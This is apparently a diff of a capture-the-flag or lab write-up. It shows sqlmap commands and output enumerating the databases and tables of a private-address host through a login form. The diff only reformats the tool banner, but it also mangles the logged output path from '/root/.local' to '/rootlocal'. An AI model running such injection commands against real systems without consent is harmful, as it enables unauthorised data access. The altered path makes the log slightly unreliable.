@@ -28,7 +28,7 @@ available databases [6]:
 [*] phpmyadmin
 [*] test
 
-[14:53:58] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.201.87.236'
+[14:53:58] [INFO] fetched data logged to text files under '/rootlocal/share/sqlmap/output/10.201.87.236'
 
 [*] ending @ 14:53:58 /2025-09-29/
 
@@ -38,11 +38,11 @@ available databases [6]:
 
 ┌──(root㉿docker-desktop)-[/]
 └─# sqlmap -u "http://10.201.87.236/ai/includes/user_login?email=test&password=test" -D ai --tables -level=5
-**\_
-**H**
-\_** **\_[)]\_\_\_** **\_ \_** {1.9.9#stable}
+\_
+H
+\_ \_[)]\_\_\_ \_ \_ {1.9.9#stable}
 |\_ -| . [)] | .'| . |
-|**_|_ ["]_|_|\_|**,| _|
+|_|_ ["]_|_|\_|,| _|
 |_|V... |\_| https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
@@ -81,7 +81,7 @@ Database: ai
 | user |
 +------+
 
-[14:59:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.201.87.236'
+[14:59:35] [INFO] fetched data logged to text files under '/rootlocal/share/sqlmap/output/10.201.87.236'
 
 [*] ending @ 14:59:35 /2025-09-29/
 
